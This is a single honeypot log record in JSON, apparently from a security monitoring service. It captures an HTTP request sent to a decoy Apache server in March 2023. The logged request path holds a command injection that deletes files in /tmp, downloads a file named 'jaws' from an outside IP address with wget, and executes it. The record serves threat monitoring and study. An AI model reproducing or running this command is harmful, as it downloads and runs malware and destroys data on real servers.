{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Fri Mar  3 00:09:02 UTC 2023","parsedMessage":{"timestamp":"2023-03-03 00:08:42+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"139.162.248.238 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.132/jaws;sh+/tmp/jaws\" 400 0 \"-\" \"-\"","ip":"139.162.248.238"},"id":"455632a8-d53e-4dee-9154-9da33f451128","EventProcessedUtcTime":"2023-03-03T00:09:02.5253839Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-03T00:09:02.3280000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/139.162.248.238"}